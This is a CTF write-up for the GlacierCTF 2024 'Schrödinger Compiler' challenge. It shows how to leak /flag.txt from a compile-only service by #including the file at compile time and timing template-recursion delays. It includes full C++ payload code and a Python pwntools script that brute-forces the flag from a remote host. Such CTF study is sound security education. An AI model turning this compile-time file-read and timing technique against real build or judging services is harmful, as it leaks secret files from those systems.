---
title: "Schrödinger Compiler - GlacierCTF 2024"
lastUpdated: 2024-11-23T00:00:00.000Z
draft: false
math: true
tags:
  - Time Attack
  - C++
  - GlacierCTF
  - Side Channel
author: "Garab"
---


## Writeup for GlacierCTF Challenge: Schrödinger Compiler

### Challenge Overview

This challenge provides a remote compilation service that compiles our C++ code but doesn't execute it. The goal is to exfiltrate the flag from `/flag.txt` using only compilation-time side channels.

### The Challenge Script

```sh
#!/bin/sh

echo "[+] Welcome to the Schrödinger Compiler"
echo "[+] We definitely don't have a flag in /flag.txt"
echo "[+] Timeout is 3 seconds, you can run it locally with deploy.sh"

echo ""

echo "[+] Submit the base64 (EOF with a '@') of a .tar.gz compressed "
echo "    .cpp file and we'll compile it for you"
echo "[+] Example: tar cz main.cpp | base64 ; echo \"@\""
echo "[>] --- BASE64 INPUT START ---"
read -d @ FILE
echo "[>] --- BASE64 INPUT END ---"

DIR=$(mktemp -d)
cd ${DIR} &> /dev/null
echo "${FILE}" | base64 -d 2>/dev/null | tar -xzO > main.cpp 2> /dev/null
echo "[+] Compiling with g++ main.cpp &> /dev/null"
g++ main.cpp

# ./main
# oops we fogot to run it
echo "[+] Bye, it was a pleasure! Come back soon!"
```

## Exploitation Strategy

### Step 1: Loading the Flag at Compile Time

The key observation: the script **compiles** our code but doesn't **run** it. However, we can still access files during compilation!

C++ preprocessor allows including files as string literals:

```cpp
const char * myString = {
    #include "/flag.txt"
};
```

This loads `/flag.txt` into `myString` **at compile time**, before the program would ever run.

### Step 2: The Problem - No Output Channel

Since our compiled binary never runs, we can't use traditional I/O. We need a side channel that's observable during compilation itself.

**Solution: Timing Attack**

We can make the compiler do variable amounts of work based on the flag's content. By measuring compilation time, we can leak information byte by byte.

### Step 3: Creating Compile-Time Delays

The idea: Create C++ code that takes significantly longer to compile when our guess is **wrong**, and compiles quickly when our guess is **correct**.

We use **template metaprogramming** to create compile-time delays. Templates are instantiated during compilation, and recursive template instantiation forces the compiler to do exponential work:

```cpp
#include <format>
#include <cstdio>
#include <type_traits>
#include <string>
#include <iostream>

// Load the flag at compile time
static constexpr const char * myString = {
    #include "/flag.txt"
};

// Factorial template for creating work
template<int N>
struct Factorial {
    static const int value = N * Factorial<N - 1>::value;
};

template<>
struct Factorial<0> {
    static const int value = 1;
};

// Recursive template to create compile-time delays
template <int N>
struct CompileTimeDelay {
    static void delay() {
        // Force template instantiation (creates work for the compiler)
        std::cout << Factorial<10>::value << std::endl;
        CompileTimeDelay<N - 1>::delay();  // Recurse N times
    }
};

// Base case: stop recursion
template <>
struct CompileTimeDelay<0> {
    static void delay() {
        // No work needed
    }
};

#define COMPILE_DELAY(N) \
    static_assert(N == 0 || N > 0, "Invalid delay value"); \
    CompileTimeDelay<N>::delay();

int main() {
    // If myString[0] != 'g', delay by 800 iterations
    // Otherwise, delay by 0 iterations (instant)
    COMPILE_DELAY(myString[0] - 'g' ? 800 : 0);
    return 0;
}
```

**How it works:**

- If `myString[0]` ≠ `'g'`: The ternary expression evaluates to `800`, instantiating `CompileTimeDelay<800>` through `CompileTimeDelay<0>`, creating massive compile-time work
- If `myString[0]` = `'g'`: The expression evaluates to `0`, instantly compiling with `CompileTimeDelay<0>`

**Timing results:**
- Wrong guess: ≈ 1.0 second compilation time
- Correct guess: ≈ 0.3 seconds compilation time

This 0.7-second difference is easily measurable over the network!

## Implementation

### Automated Flag Extraction

We automate the attack by trying each character and measuring timing:

```python
from pwn import *
import os
import subprocess
import time
import string

chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_{}"
context.log_level = 'warning'

# Template code (same as above)
text = '''
#include <format>
#include <cstdio>
#include <type_traits>
#include <string>

static constexpr const char * myString = {
    #include "/flag.txt"
};

#include <iostream>

//template factorial
template<int N>
struct Factorial {
    static const int value = N * Factorial<N - 1>::value;
};

template<>
struct Factorial<0> {
    static const int value = 1;
};

template <int N>
struct CompileTimeDelay {
    static void delay() {
        // Recursive unrolling: "doing work"
        std::cout << Factorial<10>::value << std::endl;
        CompileTimeDelay<N - 1>::delay();
    }
};

// Specialization to stop recursion when N == 0
template <>
struct CompileTimeDelay<0> {
    static void delay() {
        // factorial of 10
        // Base case: no recursion, effectively instant for N=0
    }
};

#define COMPILE_DELAY(N) \\
    static_assert(N == 0 || N > 0, "Invalid delay value"); \\
    CompileTimeDelay<N>::delay();

'''

flag = 'gctf{'  # Known flag prefix
i = len(flag)

while True:
    char_to_time = []

    # Try each possible character
    for c in chars:
        re = remote('78.47.52.31', 4126)
        re.recvuntil(b'BASE64 INPUT START ---\n')

        # Generate code that delays if myString[i] != c
        main_code = '''
int main() {
    COMPILE_DELAY(myString[%d] - '%c' ? 800 : 0);
    return 0;
}
''' % (i, c)

        # Write the complete C++ file
        with open('to_compile.cpp', 'w') as f:
            f.write(text + main_code)

        # Package and send
        cmd = 'tar cz to_compile.cpp | base64'
        result = subprocess.check_output(cmd, shell=True)
        re.sendline(result)
        re.sendline(b'@')

        # Measure compilation time
        timestart = time.time()
        re.recvall()
        elapsed = time.time() - timestart

        print(f"{c}: {elapsed:.2f}s")

        # If compilation was fast, we found the character!
        if elapsed < 0.5:
            char_to_time.append((c, elapsed))
            re.close()
            break

        char_to_time.append((c, elapsed))
        re.close()

    # Move to next character
    i += 1
    char_to_time.sort(key=lambda x: x[1])
    print(f"Timings: {char_to_time[:3]}")

    # Add the fastest (correct) character to flag
    flag += char_to_time[0][0]
    print(f"Flag so far: {flag}")
```

**How the exploit works:**

1. Start with known prefix `gctf{`
2. For each unknown position $i$:
   - Try every character $c$ in the charset
   - Measure compilation time for `myString[i] - c ? 800 : 0`
   - The **fastest** compilation reveals the correct character (note that the whole attack can be faster if you inverse the logic to `myString[i] == c ? 0 : 800`, I use the opposite here in the CTF context)
3. Repeat until we have the complete flag

## Key Takeaways

1. **Side Channels Are Everywhere**: Even compilation time can leak secrets
2. **C++ Templates Are Turing-Complete**: Template metaprogramming executes at compile time, allowing arbitrary computation
3. **Timing Attacks Don't Need Execution**: The compilation phase itself can be a side channel
4. **Network Timing Works**: Even with network latency, 0.7-second differences are reliably measurable

## Further Reading

- [Template Metaprogramming](https://en.wikipedia.org/wiki/Template_metaprogramming) - Wikipedia
- [Timing Attacks](https://en.wikipedia.org/wiki/Timing_attack) - Side-channel cryptanalysis
- [C++ Templates: The Complete Guide](http://www.tmplbook.com/) - David Vandevoorde & Nicolai M. Josuttis
- Paul Kocher's original timing attack paper (1996)
